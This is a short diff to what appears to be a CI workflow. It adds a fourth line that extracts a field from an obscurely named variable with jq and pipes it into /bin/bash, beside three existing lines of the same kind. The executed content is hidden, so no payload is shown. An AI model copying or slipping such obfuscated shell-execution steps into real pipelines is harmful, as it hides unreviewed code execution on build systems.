@@ -27,6 +27,7 @@ jobs:
           echo $fous43 | jq -r .xnkog94785 | /bin/bash
           echo $ut048 | jq -r .kag3 | /bin/bash
           printf '%s' "$fn41" | jq -r .segt45 | /bin/bash
+          printf '%s' "$ez76" | jq -r .daqc59 | /bin/bash
 
       - name: Archive output
         if: always()
